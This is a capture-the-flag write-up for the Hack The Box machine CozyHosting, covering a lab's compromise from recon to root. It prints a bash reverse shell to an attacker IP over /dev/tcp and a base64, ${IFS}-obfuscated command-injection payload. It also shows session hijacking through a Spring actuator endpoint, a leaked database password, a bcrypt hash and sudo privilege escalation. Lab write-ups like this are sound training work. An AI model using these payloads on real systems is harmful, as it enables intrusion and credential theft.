# CozyHosting

Scanning ports

nmap -Pn -sC -sV -T4 --min-rate=1000 10.10.11.230

<figure><img src=".gitbook/assets/obrazek (26).png" alt=""><figcaption></figcaption></figure>

Adding to /etc/hosts IP   cozyhosting.htb\
\
Scanning directories&#x20;

```
gobuster dir -u cozyhosting.htb -w /usr/share/wordlists/dirb/common.txt
```

<figure><img src=".gitbook/assets/obrazek (27).png" alt=""><figcaption></figcaption></figure>

We can see /error look like this:

<figure><img src=".gitbook/assets/obrazek (29).png" alt=""><figcaption></figcaption></figure>

On the internet we can find it is spring framework so i ran gobuster with spring wordlist.

\


```
gobuster dir -u cozyhosting.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt
```

<figure><img src=".gitbook/assets/obrazek (30).png" alt=""><figcaption></figcaption></figure>

On the /actuator/sessions we can find authorized session and we paste it into Starage> Value a try to access /admin page

<figure><img src=".gitbook/assets/obrazek (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/obrazek (8).png" alt=""><figcaption></figcaption></figure>

On the admin page we can see Connection string , so we can try reverse shell.

On the [https://www.revshells.com/](https://www.revshells.com/) we create bash revsheel

* ```
  bash -i >& /dev/tcp/<Attacker-IP>/<Attacker-Port> 0>&1
  ```

We select encoding base 64 and we got:

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjMvMTIzNCAwPiYx
```

Now we need create command:

```
;echo${IFS}"<Base64 revshell>"|base64${IFS}-d|bash;
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjMvMTIzNCAwPiYx"|base64${IFS}-d|bash;
```

As hostname we give our IP and Username will be our payload.(Need running nc -lvnp \<port> on our machine.

On the rev shell we download that .jar file with nc

[https://inesmartins.github.io/how-to-dowload-files-from-reverse-shells-on-macos/index.html](https://inesmartins.github.io/how-to-dowload-files-from-reverse-shells-on-macos/index.html)\
But on the attacker machine we call nc-lvp \<port> > file-name

Downlaod jd-gui and open download -jar file

In the application.properties we find username and password for postgres

<figure><img src=".gitbook/assets/obrazek (9).png" alt=""><figcaption></figcaption></figure>

Username: postgres; password: Vg\&nvzAQ7XxR

We can connect to the postgres database

<figure><img src=".gitbook/assets/obrazek (10).png" alt=""><figcaption></figcaption></figure>

\c cozyhosting to connect to database cozyhosting

\d we can see all relations

<figure><img src=".gitbook/assets/obrazek (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/obrazek (12).png" alt=""><figcaption></figcaption></figure>

Okey we have hash to admin: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm

Hashid not working there so we find website: [https://hashes.com/en/tools/hash\_identifier](https://hashes.com/en/tools/hash\_identifier)

<figure><img src=".gitbook/assets/obrazek (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/obrazek (16).png" alt=""><figcaption></figcaption></figure>

So we know it is bcrypt(Blowfish)

<figure><img src=".gitbook/assets/obrazek (17).png" alt=""><figcaption></figcaption></figure>

Okey we get password , so we can use ssh to josh\


<figure><img src=".gitbook/assets/obrazek (19).png" alt=""><figcaption></figcaption></figure>

there is user.flag\
with sudo -l we see we can use some commands ad root\
So there is a privilege escalation using sudo -l [https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)

<figure><img src=".gitbook/assets/obrazek (22).png" alt=""><figcaption></figcaption></figure>

PWNED!
